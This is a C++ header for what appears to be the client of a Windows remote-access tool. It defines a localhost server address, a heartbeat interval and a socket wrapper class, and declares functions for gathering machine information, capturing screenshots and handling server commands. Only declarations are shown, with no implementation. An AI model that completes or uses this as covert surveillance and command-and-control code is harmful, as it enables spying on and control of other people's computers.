
#pragma once
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
//#include <winsock2.h>
#include <stdio.h>
#include <gdiplus.h>
#include <iphlpapi.h>
#include <lm.h>
#include <time.h>
#include <memory>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "netapi32.lib")

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 5000
#define HEARTBEAT_INTERVAL 60000 // 1 minute

class SmartSocket {
public:
	SmartSocket() {};
	SmartSocket(SOCKET socket) : handle(socket) {}
	~SmartSocket() {
		closesocket(handle);
		WSACleanup();
	}
	operator SmartSocket() { return handle; }
	operator SOCKET() { return handle; }
	operator bool() { return handle != INVALID_SOCKET; }
	SmartSocket& operator =(const SOCKET& socket) {
		handle = socket;
		return *this;
	}
	SmartSocket& operator =(SmartSocket& socket) {
		handle = socket.handle;
		socket.handle = INVALID_SOCKET;
		return *this;
	}
private:
	SOCKET handle = INVALID_SOCKET;
};
SmartSocket clientSocket;

char computerName[MAX_COMPUTERNAME_LENGTH + 1];
char userName[MAX_COMPUTERNAME_LENGTH + 1];
char machineInfo[128];
int getMachineInformation();
void captureScreenshot();
int connectToServer();
void handleServerCommands();
DWORD WINAPI sendHeartbeat(LPVOID);
